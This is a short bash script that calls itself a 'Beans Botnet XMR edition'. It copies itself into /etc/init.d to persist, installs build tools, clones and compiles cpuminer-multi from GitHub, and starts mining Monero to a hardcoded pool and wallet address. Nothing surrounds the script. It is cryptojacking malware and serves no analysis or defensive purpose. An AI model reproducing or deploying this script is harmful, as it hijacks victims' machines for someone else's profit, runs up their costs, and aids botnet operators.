#!/bin/bash -x
################
#    Beans     # XMR EDITION
#    Botnet    # V = 1.2
###############
filename="$0"
# Persistance Mech
mv $filename /etc/init.d/
chmod +x /etc/init.d/$filename
##################
# Config
pool="pool.hashvault.pro:443"
addr="46z5cQxqzRZ1HBRWRexRh4PhAKUpreKigFHhVGAsJ5aob4y2j8467Af4CuyfDC7pC6afEsLrCEKQFRptxi3z6dBk1vyLt42"
algo="cryptonight"
# End of config
apt-get update && apt-get upgrade -y
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git nano
apt-get install autoconf pkg-config libgmp-dev zlib1g-dev make g++
git clone --single-branch -b linux https://github.com/tpruvot/cpuminer-multi
cd cpuminer-multi
chmod +x build.sh
chmod +X autogen.sh
./build.sh || sh build.sh
./cpuminer -a $algo --url $pool -u $addr
